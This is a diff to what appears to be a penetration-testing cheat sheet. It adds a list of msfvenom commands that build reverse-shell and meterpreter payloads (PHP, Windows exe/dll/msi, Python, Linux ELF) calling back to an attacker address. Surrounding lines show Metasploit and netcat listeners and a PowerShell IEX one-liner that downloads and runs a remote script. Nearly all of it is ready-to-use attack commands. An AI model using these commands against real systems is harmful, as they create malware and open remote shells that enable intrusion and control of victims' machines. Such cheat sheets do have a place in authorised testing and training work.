@@ -100,6 +100,23 @@ rlwrap msfconsole -q -x "use multi/handler; set payload windows/powershell_rever
 rlwrap msfconsole -q -x "use multi/handler; set payload windows/shell_reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
 rlwrap nc -lvnp 5555
 
+## MSFVenom
+msfvenom -p php/reverse_php LHOST=$MYIP LPORT=5555 -f raw -o shell.php
+msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.php
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o shell.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
+msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o shell.dll
+msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
+msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.py
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
+
 ## File Transfer
 python3 -m http.server 80 -d ~/Upload
 "powershell -c IEX (New-Object Net.WebClient).DownloadString(''http://$MYIP/tools.ps1'')"
